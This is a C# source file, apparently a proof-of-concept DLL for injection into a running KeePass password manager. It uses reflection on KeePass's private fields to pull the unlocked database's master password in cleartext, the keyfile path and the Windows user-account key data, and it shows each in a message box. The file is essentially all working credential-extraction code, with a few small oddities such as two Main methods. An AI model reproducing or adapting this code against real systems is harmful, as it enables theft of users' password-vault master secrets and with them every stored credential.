using System;
using System.Collections;
using System.Linq;
using System.Reflection;
using System.Windows.Forms;

namespace KeePassHax
{
    public static class Program
    {
        public static int Main(string args)
        {
            RealMain();
            return 0;
        }

        public static void Main(string[] args)
        {
            RealMain();
        }

        private static void RealMain()
        {
            MessageBox.Show("Loading from injected DLL!", "Test");

            // Try to get the entry assembly, and find the Program class
            Assembly asm = Assembly.GetEntryAssembly();
            Type programType = asm.EntryPoint.DeclaringType;
            MessageBox.Show(programType.FullName, "Program type");

            // Get the main form
            var formField = programType.GetFieldStatic("m_formMain");
            var formInstance = formField;

            // Go down the rabbit hole to find more stuff
            var docMgr = formInstance.GetFieldInstance("m_docMgr");
            var dsActive = docMgr.GetFieldInstance("m_dsActive");
            var db = dsActive.GetFieldInstance("m_pwDb");
            var compositeKey = db.GetFieldInstance("m_pwUserKey");

            // Get all items that make up the CompositeKey
            var userKeys = (IList)compositeKey.GetFieldInstance("m_vUserKeys");
            foreach (object key in userKeys) {

                switch (key.GetType().ToString()) {
                    case "KeePassLib.Keys.KcpPassword":
                        // Read the m_psPassword field, which is a ProtectedString
                        var passProt = key.GetFieldInstance("m_psPassword");

                        // Invoke the ReadString function, which returns a plaintext string
                        string cleartext = (string)passProt.GetType().GetMethod("ReadString")?.Invoke(passProt, null);
                        MessageBox.Show("Extracted password: " + cleartext, key.ToString());
                        break;
                    case "KeePassLib.Keys.KcpKeyFile":
                        // Read the m_strPath field, which contains the path to the keyfile
                        // We could also read m_pbKeyData which is a ProtectedBinary, but that's slightly more effort :)
                        var keyPath = key.GetFieldInstance("m_strPath");
                        MessageBox.Show("KeyFile path: " + keyPath, key.ToString());
                        break;
                    case "KeePassLib.Keys.KcpUserAccount":
                        // So technically, we don't even need to extract this one from the current process, since it's accessible by any program 
                        // running in this user's context. But just for good measure (and to keep code simple), I'll extract this from memory too.
                        var userAccData = key.GetFieldInstance("m_pbKeyData");
                        byte[] userAccDataClear = (byte[])userAccData.GetType().GetMethod("ReadData")?.Invoke(userAccData, null);
                        MessageBox.Show("Extracted UserAccount data: " + string.Join("-", userAccDataClear.Select(x => x.ToString("X2"))), key.ToString());
                        break;
                }
            }
        }

        private static object GetFieldInstance(this object o, string name) => o.GetType().GetField(name, BindingFlags.Public | BindingFlags.NonPublic | BindingFlags.Instance)?.GetValue(o);
        private static object GetFieldStatic(this IReflect t, string name) => t.GetField(name, BindingFlags.Public | BindingFlags.NonPublic | BindingFlags.Static)?.GetValue(null);
    }
}
